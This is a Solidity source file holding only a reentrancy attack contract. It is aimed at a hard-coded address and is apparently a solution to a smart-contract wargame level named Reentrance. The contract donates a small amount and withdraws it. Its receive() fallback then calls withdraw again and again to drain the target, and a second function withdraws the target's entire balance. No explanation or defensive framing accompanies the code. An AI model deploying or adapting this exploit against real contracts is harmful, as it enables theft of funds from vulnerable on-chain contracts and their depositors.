// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface Reentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
}

contract ReentranceAttack {

    Reentrance challenge = Reentrance(0x8F65C94071c45B81399F7C5fFDD106C628DbbacB);

    function attack1() public payable {
        challenge.donate{value:1}(address(this));
        challenge.withdraw(1);
    }

    function attack_2_deplete() public {
        challenge.withdraw(address(challenge).balance);
    }

    receive() external payable {
        challenge.withdraw(1);
    }
}